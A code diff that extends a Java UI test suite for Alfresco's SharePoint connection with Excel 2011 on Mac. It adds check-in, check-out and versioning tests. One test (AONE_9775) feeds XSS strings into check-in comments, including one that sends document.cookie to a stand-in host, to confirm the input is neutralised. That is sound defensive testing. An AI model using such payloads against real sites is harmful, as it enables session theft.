@@ -26,8 +26,11 @@ import org.testng.annotations.Parameters;
 import org.testng.annotations.Test;
 
 /**
- * Please pay attention that there is an error that sometimes occures on Office2011 application on MAC: issue logged as MNT-12847
+ * Please pay attention that there is an error that sometimes occurs on Office2011 application on MAC: issue logged as MNT-12847
  * 
+ * @description
+ *              This tests should be executed ONLY on a OSx system, where Office2011 is installed
+ *              The Alfresco Server version should be lower than 5.0 (Alfresco Enterprise v4.2.5 version was used on Tests)
  * @author Paul Brodner
  */
 @Listeners(FailedTestListener.class)
@@ -37,14 +40,23 @@ public class MSExcel2011Tests extends AbstractUtils
     private String testUser;
     private String testSiteName;
 
+    private File xlsMacOfficeFile;
     private File xls9760TestFile;
     private File xls9761TestFile;
     private File xls9762TestFile;
-    private File xls9761DownloadTestFile = new File(System.getProperty("user.home"), "Documents/tmpxls9761TestFile.xlsx");
+    private File xlsTempTestFile = new File(System.getProperty("user.home"), "Documents/tmpxls9761TestFile.xlsx");
     private File xls9763TestFile;
     private File xls9764TestFile;
     private File xls9765TestFile;
     private File xls9766TestFile;
+    private File xls9767TestFile;
+    private File xls9768TestFile;
+    private File xls9769TestFile;
+    private File xls9770TestFile;
+    private File xls9771TestFile;
+    private File xls9772TestFile;
+    private File xls9773TestFile;
+    private File xls9775TestFile;
 
     private ArrayList<File> testFiles = new ArrayList<File>();
 
@@ -62,14 +74,15 @@ public class MSExcel2011Tests extends AbstractUtils
         super.setup();
         appExcel2011 = new MicrosoftExcel2011();
         appExcel2011.killProcesses();
-        if (TESTID == null)
-            TESTID = "0";
+        if (TESTID == null || TESTID.contains("testid"))
+            TESTID = "149";
 
         testName = this.getClass().getSimpleName() + TESTID;
         testUser = getUserNameFreeDomain(testName);
         testSiteName = getSiteName(testName);
 
         // used from testdata folder
+        xlsMacOfficeFile = getTestDataFile(SHAREPOINT, "MacOffice.xlsx");
         xls9760TestFile = getTestDataFile(SHAREPOINT, "AONE-9760.xlsx");
         xls9761TestFile = getTestDataFile(SHAREPOINT, "AONE-9761.xlsx");
         xls9762TestFile = getTestDataFile(SHAREPOINT, "AONE-9762.xlsx");
@@ -78,12 +91,29 @@ public class MSExcel2011Tests extends AbstractUtils
         xls9764TestFile = getTestDataFile(SHAREPOINT, "InputOpen.xlsx");
         xls9766TestFile = getTestDataFile(SHAREPOINT, "AONE-9766.xlsx");
 
+        xls9767TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9767.xlsx");
+        xls9768TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9768.xlsx");
+        xls9769TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9769.xlsx");
+        xls9770TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9770.xlsx");
+        xls9771TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9771.xlsx");
+        xls9772TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9772.xlsx");
+        xls9773TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9773.xlsx");
+        xls9775TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9775.xlsx");
+
         // this files will be uploaded on dataprep
         testFiles.add(xls9761TestFile);
         testFiles.add(xls9762TestFile);
         testFiles.add(xls9763TestFile);
-        testFiles.add(xls9766TestFile);
         testFiles.add(xls9764TestFile);
+        testFiles.add(xls9766TestFile);
+        testFiles.add(xls9767TestFile);
+        testFiles.add(xls9768TestFile);
+        testFiles.add(xls9769TestFile);
+        testFiles.add(xls9770TestFile);
+        testFiles.add(xls9771TestFile);
+        testFiles.add(xls9772TestFile);
+        testFiles.add(xls9773TestFile);
+        testFiles.add(xls9775TestFile);
     }
 
     @Override
@@ -100,6 +130,8 @@ public class MSExcel2011Tests extends AbstractUtils
         {
             logger.error("Error on TearDown Office 2011" + e.getMessage());
         }
+
+        deleteDuplicatedFiles();
 
         super.tearDown();
     }
@@ -134,7 +166,7 @@ public class MSExcel2011Tests extends AbstractUtils
         }
 
         xls9765TestFile.delete();
-        xls9761DownloadTestFile.delete();
+        xlsTempTestFile.delete();
     }
 
     /**
@@ -198,10 +230,10 @@ public class MSExcel2011Tests extends AbstractUtils
         // The document was uploaded correctly
         Assert.assertTrue(documentLibraryPage.isFileVisible(xls9760TestFile.getName()), "The document was uploaded corectly.");
         // No data was lost (checking the size of the document uploaded)
-        Assert.assertEquals(DocumentLibraryUtil.getDocumentProperties(documentLibraryPage, xls9760TestFile.getName()).size(), 10);
+        Assert.assertEquals(DocumentLibraryUtil.getDocumentProperties(documentLibraryPage, xls9760TestFile.getName()).size(), 10,
+                "The document was uploaded correctly");
 
         appExcel2011.getMDC().exitApplication();
-
         ShareUser.logout(drone);
     }
 
@@ -232,20 +264,19 @@ public class MSExcel2011Tests extends AbstractUtils
         // Choose any location, e.g. Desktop, specify any name and click on Save button.
         // ---- Expected results ----
         // The document is downloaded.
-        appExcel2011.getMDC().saveAsFirstDocumentAs(xls9761DownloadTestFile);
+        appExcel2011.getMDC().saveAsFirstDocumentAs(xlsTempTestFile);
 
         // ---- Step 3 ----
         // ---- Step action ----
         // Verify the chosen location, e.g. Desktop.
         // ---- Expected results ----
         // The document was downloaded correctly. No data was lost.
+        xlsTempTestFile = new File(System.getProperty("user.home"), "Documents/tmpxls9761TestFile.xlsx");
+        boolean fileSaved = FileBaseUtils.waitForFile(xlsTempTestFile);
 
-        xls9761DownloadTestFile = new File(System.getProperty("user.home"), "Documents/tmpxls9761TestFile.xlsx");
-        boolean fileSaved = FileBaseUtils.waitForFile(xls9761DownloadTestFile);
-
-        Assert.assertTrue(fileSaved, "File " + xls9761DownloadTestFile.getName() + " was saved localy from MDC.");
-        Assert.assertEquals(xls9761DownloadTestFile.length(), 8679, "Data was lost from the file downloaded");
-        xls9761DownloadTestFile.delete();
+        Assert.assertTrue(fileSaved, "The document " + xlsTempTestFile.getName() + " was saved localy from MDC.");
+        Assert.assertEquals(xlsTempTestFile.length(), 8679, "No data was lost.");
+        xlsTempTestFile.delete();
         appExcel2011.getMDC().exitApplication();
     }
 
@@ -277,7 +308,7 @@ public class MSExcel2011Tests extends AbstractUtils
 
         appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);
         boolean isReadOnly = appExcel2011.isFileInReadOnlyMode(xls9762TestFile.getName());
-        Assert.assertTrue(isReadOnly, "File was opened in Read Only mode");
+        Assert.assertTrue(isReadOnly, "The document is opened in a read-only mode.");
         appExcel2011.getMDC().focus();
 
         // ---- Step 2 ----
@@ -380,11 +411,11 @@ public class MSExcel2011Tests extends AbstractUtils
 
         ShareUser.openDocumentLibrary(drone);
         isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, xls9763TestFile.getName());
-        Assert.assertTrue(isLocked, "This document is locked by you.");
+        Assert.assertTrue(isLocked, "This document is locked by you for offline editing.");
 
         // check we have a new minor version
         String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
-        Assert.assertNotEquals(oldVersion, currentVersion);
+        Assert.assertNotEquals(oldVersion, currentVersion, "A new minor version is created.");
 
         appExcel2011.closeFile(xls9763TestFile.getName());
         appExcel2011.getMDC().exitApplication();
@@ -423,7 +454,7 @@ public class MSExcel2011Tests extends AbstractUtils
         appExcel2011.getMDC().editFirstDocument();
         appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);
 
-        // {Paul: cannot use Open URL, Appliction will crash}
+        // {Paul: cannot use Open URL, Application will crash}
         // appExcel2011.openURL(getVTIDocumentLibraryFilePath(testSiteName, xlsCommonFile.getName()));
 
         // ---- Step 2 ----
@@ -446,10 +477,10 @@ public class MSExcel2011Tests extends AbstractUtils
         docDetailsPage.getDrone().getCurrentPage().render();
 
         boolean isLocked = docDetailsPage.isCheckedOut();
-        Assert.assertTrue(isLocked, "File is locked after is was opened localy from Excel");
+        Assert.assertTrue(isLocked, "The document is still locked for editing.");
 
         String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
-        Assert.assertNotEquals(oldVersion, currentVersion);
+        Assert.assertNotEquals(oldVersion, currentVersion, "A new minor version is created.");
 
         appExcel2011.exitApplication();
         ShareUser.logout(drone);
@@ -470,7 +501,6 @@ public class MSExcel2011Tests extends AbstractUtils
     @Test(groups = "Enterprise4.2", description = "Edit document - Upload File")
     public void AONE_9765() throws Exception
     {
-
         appExcel2011.openApplication();
         appExcel2011.edit("some test data");
         appExcel2011.saveAs(xls9765TestFile);
@@ -530,4 +560,550 @@ public class MSExcel2011Tests extends AbstractUtils
                 "This document is locked by you for offline editing.");
     }
 
+    /**
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded to the site's document library;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened.
+     * The document is checked out and is opened for editing.
+     */
+    @Test(groups = "Enterprise4.2", description = "Edit checked out document")
+    public void AONE_9767() throws Exception
+    {
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+
+        appExcel2011.getMDC().checkOutFile(xls9767TestFile.getName());
+        openDocumentLibraryForTest();
+        appExcel2011.waitForWindow(xls9767TestFile.getName());
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Enter any data.
+        // ---- Expected results ----
+        // he data is entered.
+        appExcel2011.edit("edit with some data");
+        appExcel2011.setFileName(xls9767TestFile.getName());
+        appExcel2011.saveAndClose();
+        appExcel2011.getMDC().focus();
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // Save the document and close MS Excel app
+        // ---- Expected results ----
+        // The document is saved successfully. The document is still checked out.
+        Assert.assertEquals(appExcel2011.getMDC().isBtnCheckOutEnabled(), 0);
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The document is locked. "The document is locked by you for offline editing" message is displayed. No changes are present. No new versions were
+        // created.
+        appExcel2011.exitApplication();
+        boolean isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, xls9767TestFile.getName());
+        Assert.assertTrue(isLocked, "This document is locked by you for offline editing.");
+    }
+
+    /**
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded to the site's document library;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened.
+     * The document is opened for editing.
+     * Any data is entered into the opened document.
+     */
+    @Test(groups = "Enterprise4.2", description = "Edit document - Save the changes")
+    public void AONE_9768() throws Exception
+    {
+        openDocumentLibraryForTest();
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9768TestFile.getName()).render();
+        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+
+        appExcel2011.getMDC().search(xls9768TestFile.getName());
+        appExcel2011.getMDC().editFirstDocument();
+        appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);
+
+        appExcel2011.waitForWindow(xls9768TestFile.getName());
+        appExcel2011.edit("edit with some data");
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Choose the File > Save action.
+        // ---- Expected results ----
+        // The document is saved correctly.
+        appExcel2011.save();
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The changes are applied. A new minor version is created. The document is still locked.
+        documentLibraryPage.getDrone().refresh();
+        // check we have a new minor version
+        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
+        Assert.assertTrue(docDetailsPage.isLockedByYou(), "The document is still locked.");
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // Close the document and the MS Excel app.
+        // ---- Expected results ----
+        // The document is closed.
+        appExcel2011.closeFile();
+        Assert.assertFalse(appExcel2011.isFileOpened(xls9768TestFile.getName()));
+
+        // ---- Step 4 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The document is unlocked and was not changed. No new version were created.
+        documentLibraryPage.getDrone().refresh();
+        // check we have a new minor version
+        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertNotEquals(oldVersion, currentVersion, "No new version were created.");
+        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked and was not changed.");
+    }
+
+    /**
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded to the site's document library;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened.
+     * The document is checked out and is opened for editing.
+     */
+    @Test(groups = "Enterprise4.2", description = "Check in without editing")
+    public void AONE_9769() throws Exception
+    {
+        // preconditions-initialization
+        String strCheckInComment = "test abcdefg";
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+
+        openDocumentLibraryForTest();
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9769TestFile.getName()).render();
+        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+
+        appExcel2011.getMDC().checkOutFile(xls9769TestFile.getName());
+        openDocumentLibraryForTest();
+        appExcel2011.waitForWindow(xls9769TestFile.getName());
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Do not enter any data.
+        // ---- Expected results ----
+        // The data is entered.
+        // {PaulB nothing to do here}
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // Do not save the document and close MS Excel app.
+        // ---- Expected results ----
+        // The document is not saved. The document is still checked out.
+        appExcel2011.closeFile();
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // In Document Connection app, choose the checked out document and click on Check In.
+        // ---- Expected results ----
+        // Check In window is displayed.
+        // {PaulB the doc is already checked out we don't need to checkout again}
+        appExcel2011.getMDC().focus();
+        appExcel2011.getMDC().checkInFile(xls9769TestFile.getName());
+
+        // ---- Step 4 ----
+        // ---- Step action ----
+        // Enter any comment and click on Check In button.
+        // ---- Expected results ----
+        // The document is checked in successfully.
+        appExcel2011.getMDC().checkInWithComment(strCheckInComment);
+
+        // ---- Step 5 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The document is unlocked. A new major version is created. The specified comment is present in the version history.
+        documentLibraryPage.getDrone().refresh();
+        // check we have a new minor version
+        documentLibraryPage.selectFile(xls9769TestFile.getName()).render();
+
+        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
+        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked.");
+        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment);
+    }
+
+    /*
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded to the site's document library;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened.
+     * The document is checked out and is opened for editing.
+     */
+    @Test(groups = "Enterprise4.2", description = "Check in and keep checked out")
+    public void AONE_9770() throws Exception
+    {
+        String strCheckInComment = "test abcdefg";
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+        openDocumentLibraryForTest();
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9770TestFile.getName()).render();
+        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        appExcel2011.getMDC().checkOutFile(xls9770TestFile.getName());
+        appExcel2011.waitForWindow(xls9770TestFile.getName());
+        appExcel2011.setFileName(xls9770TestFile.getName());
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Enter any data.
+        // ---- Expected results ----
+        // The data is entered.
+        appExcel2011.edit("edit file after checkout");
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // Save the document and close MS Excel app.
+        // ---- Expected results ----
+        // The document is saved. The document is still checked out.
+        appExcel2011.saveAndClose();
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // In Document Connection app, choose the checked out document and click on Check In.
+        // ---- Expected results ----
+        // Check In window is displayed.
+        appExcel2011.getMDC().search(xls9770TestFile.getName());
+        appExcel2011.getMDC().clickCheckIn();
+        appExcel2011.getMDC().checkInWithComment(strCheckInComment);
+
+        // ---- Step 4 ----
+        // ---- Step action ----
+        // Enter any comment, check 'Keep file checked out after checking in this version' check-box and click on Check In button.
+        // ---- Expected results ----
+        // The document is checked in successfully. The document is still marked as checked out in the Document Connection app.
+        appExcel2011.getMDC().search(xls9770TestFile.getName());
+        appExcel2011.getMDC().clickFirstDocument();
+        Assert.assertEquals(appExcel2011.getMDC().isBtnCheckOutEnabled(), 1, "The document is still marked as checked out in the Document Connection app");
+
+        // ---- Step 5 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The document is still locked. A new major version is created. The specified comment is present in the version history. All changes are applied.
+
+        documentLibraryPage.getDrone().refresh();
+        // check we have a new minor version
+        // documentLibraryPage.selectFile(xls9770TestFile.getName()).render();
+
+        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
+        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked.");
+        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment);
+    }
+
+    /*
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded to the site's document library;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened.
+     * The document is checked out and is opened for editing.
+     */
+    @Test(groups = "Enterprise4.2", description = "Check in without keeping checked out")
+    public void AONE_9771() throws Exception
+    {
+        String strCheckInComment = "test abcdefg";
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+        openDocumentLibraryForTest();
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9771TestFile.getName()).render();
+        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        appExcel2011.getMDC().checkOutFile(xls9771TestFile.getName());
+        appExcel2011.waitForWindow(xls9771TestFile.getName());
+        appExcel2011.setFileName(xls9771TestFile.getName());
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Enter any data.
+        // ---- Expected results ----
+        // The data is entered.
+        appExcel2011.edit("edit file after checkout");
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // Save the document and close MS Excel app.
+        // ---- Expected results ----
+        // The document is saved. The document is still checked out.
+        appExcel2011.focus();
+        appExcel2011.save();
+        appExcel2011.closeFile();
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // In Document Connection app, choose the checked out document and click on Check In.
+        // ---- Expected results ----
+        // Check In window is displayed.
+        appExcel2011.getMDC().search(xls9771TestFile.getName());
+        appExcel2011.getMDC().clickFirstDocument();
+        appExcel2011.getMDC().clickCheckIn();
+
+        // ---- Step 4 ----
+        // ---- Step action ----
+        // Enter any comment, check 'Keep file checked out after checking in this version' check-box and click on Check In button.
+        // ---- Expected results ----
+        // The document is checked in successfully. The document is still marked as checked out in the Document Connection app.
+        appExcel2011.getMDC().keepFileCheckedOut(true);
+        appExcel2011.getMDC().checkInWithComment(strCheckInComment);
+        appExcel2011.getMDC().search(xls9771TestFile.getName());
+        appExcel2011.getMDC().clickFirstDocument();
+        Assert.assertEquals(appExcel2011.getMDC().isBtnCheckOutEnabled(), 1, "The document is still marked as checked out in the Document Connection app");
+
+        // ---- Step 5 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The document is still locked. A new major version is created. The specified comment is present in the version history. All changes are applied.
+
+        documentLibraryPage.getDrone().refresh();
+        // check we have a new minor version
+        // documentLibraryPage.selectFile(xls9770TestFile.getName()).render();
+
+        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
+        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked.");
+        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment);
+    }
+
+    /*
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened;
+     * The document is checked out;
+     * Some changes are made for the document;
+     * The changes are saved and Word app is closed.
+     */
+    @Test(groups = "Enterprise4.2", description = "Check In document. Cancel check in")
+    public void AONE_9772() throws Exception
+    {
+        String strCheckInComment = "test abcdefg";
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+        openDocumentLibraryForTest();
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9772TestFile.getName()).render();
+        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+
+        appExcel2011.getMDC().checkOutFile(xls9772TestFile.getName());
+        appExcel2011.waitForWindow(xls9772TestFile.getName());
+        appExcel2011.setFileName(xls9772TestFile.getName());
+        appExcel2011.edit("edit file after checkout");
+        appExcel2011.focus();
+        appExcel2011.save();
+        appExcel2011.closeFile();
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Click on the document and then click on the Check In button on the top panel.
+        // ---- Expected results ----
+        // Check In window is displayed.
+        appExcel2011.getMDC().clickFirstDocument();
+        appExcel2011.getMDC().clickCheckIn();
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // Enter any string to the Comments section.
+        // ---- Expected results ----
+        // Data is entered.
+        appExcel2011.getMDC().getLdtp().enterString(strCheckInComment);
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // Click on Cancel button.
+        // ---- Expected results ----
+        // Check In window is closed. The document is still checked out.
+        appExcel2011.getMDC().clickCancel();
+
+        // ---- Step 4 ----
+        // ---- Step action ----
+        // Log into the Share.
+        // ---- Expected results ----
+        // User is logged in successfully.
+
+        // {paulb: we are already logged in from prerequisites}
+
+        // ---- Step 5 ----
+        // ---- Step action ----
+        // Verify the document.
+        // ---- Expected results ----
+        // The document is checked out. The changes are not applied. Version isn't changed. No comment is added.
+        documentLibraryPage.getDrone().refresh();
+
+        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertTrue(docDetailsPage.isCheckedOut(), "The document is checked out.");
+        Assert.assertEquals(oldVersion, currentVersion, "Version isn't changed.");
+        Assert.assertNotEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment, "No comment is added.");
+    }
+
+    /*
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded to the site's document library;
+     * MS Document Connection is opened;
+     * A share point connection to Alfresco is created;
+     * Site Document Library is opened.
+     * The document is checked out and is opened for editing.
+     */
+    @Test(groups = "Enterprise4.2", description = "Discard while editing document")
+    public void AONE_9774() throws Exception
+    {
+        String testFile = xls9773TestFile.getName();
+
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+        openDocumentLibraryForTest();
+
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
+        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        appExcel2011.getMDC().checkOutFile(testFile);
+        appExcel2011.waitForWindow(testFile);
+        appExcel2011.setFileName(testFile);
+
+        // ---- Step 1 ----
+        // ---- Step action ----
+        // Enter any data.
+        // ---- Expected results ----
+        // The data is entered.
+        appExcel2011.edit("From Iasi with Love");
+
+        // ---- Step 2 ----
+        // ---- Step action ----
+        // In Document Connection app, choose the checkout document and click on Discard button.
+        // ---- Expected results ----
+        // The document stopped editing. It is not marked out as checked out. No changes are applied.
+        appExcel2011.getMDC().clickDiscard();
+        appExcel2011.exitApplication();
+
+        // ---- Step 3 ----
+        // ---- Step action ----
+        // Verify the document library of the site in the Share.
+        // ---- Expected results ----
+        // The document is not locked. No version was created. No changes were applied.
+        documentLibraryPage.getDrone().refresh();
+
+        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+        Assert.assertTrue(docDetailsPage.isCheckedOut(), "The document is not locked.");
+        Assert.assertEquals(oldVersion, currentVersion, "No version was created. No changes were applied.");
+    }
+
+    /*
+     * Any site is created in Share;
+     * Any MS Excel document is uploaded;
+     * MS Document Connection is opened;
+     * A sharepoint connection to Alfresco is created;
+     * Site Document Library is opened;
+     * The document is checked out;
+     * Some changes are made for the document;
+     * The changes are saved and Word app is closed.
+     */
+    @Test(groups = "Enterprise4.2", description = "Check In document. Comment with XSS")
+    public void AONE_9775() throws Exception
+    {
+        
+        String[] xssComments = new String[5]; 
+        xssComments[0]="asda";
+        //xssComments[0]="<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
+        xssComments[1]="<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
+        xssComments[2]="<DIV STYLE=\"width: expression(alert('XSS'));\">";
+        xssComments[3]="<IMG STYLE=\"xss:expr/*XSS*/session(alert('XSS'))\">";
+        xssComments[4]="<img><scrip<script>t>alert('XSS');<</script>/script>";
+       
+        String strCheckInComment = "";
+        String testFile = xls9775TestFile.getName();
+        String currentVersion = "";
+
+        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
+        openDocumentLibraryForTest();
+        // we need to know first the current version of the document
+        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
+
+        for (int i = 0; i < xssComments.length; i++)
+        {
+
+            strCheckInComment = xssComments[i];
+
+            appExcel2011.getMDC().checkOutFile(testFile);
+            appExcel2011.waitForWindow(testFile);
+            appExcel2011.setFileName(testFile);
+            appExcel2011.focus();
+            appExcel2011.save();
+            appExcel2011.closeFile();
+
+            documentLibraryPage.getDrone().refresh();
+            String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+
+            // ---- Step 1 ----
+            // ---- Step action ----
+            // Click on the document and then click on the Check In button on the top panel.
+            // ---- Expected results ----
+            // Check In window is displayed.
+            appExcel2011.getMDC().clickFirstDocument();
+
+            // ---- Step 2 ----
+            // ---- Step action ----
+            // Enter one of the following strings to the Comments section:
+            // <IMG """><SCRIPT>alert("test")</SCRIPT>">
+            // <img src="1" onerror="window.open('http://somenastyurl?'+(document.cookie))">
+            // <DIV STYLE="width: expression(alert('XSS'));">
+            // <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+            // <img><scrip<script>t>alert('XSS');<</script>/script>
+            // ---- Expected results ----
+            // Comment is entered. No XSS attack is made.
+
+            // ---- Step 3 ----
+            // ---- Step action ----
+            // Click on CheckIn button button.
+            // ---- Expected results ----
+            // Check In window is closed. No XSS attack is made. Data proceeded correctly. The document is not marked as checked out.
+            appExcel2011.getMDC().clickCheckIn();
+            appExcel2011.getMDC().checkInWithComment(strCheckInComment);
+
+            // ---- Step 4 ----
+            // ---- Step action ----
+            // Log into the Share.
+            // ---- Expected results ----
+            // User is logged in successfully.
+
+            // {paulb: we are already logged in from prerequisites}
+
+            // ---- Step 5 ----
+            // ---- Step action ----
+            // Verify the document.
+            // ---- Expected results ----
+            // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
+            // is made.
+            documentLibraryPage.getDrone().refresh();
+
+            currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
+            Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
+            Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
+            Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment,
+                    "Entered string is added as a comment. No XSS attack is made");
+
+            // ---- Step 6 ----
+            // ---- Step action ----
+            // Verify the same scenario against all the left strings.
+            // ---- Expected results ----
+            // Performed correctly. No XSS attack is made.
+            // {paulb: see the loop above}
+        }
+
+        appExcel2011.getMDC().exitApplication();
+
+    }
 }
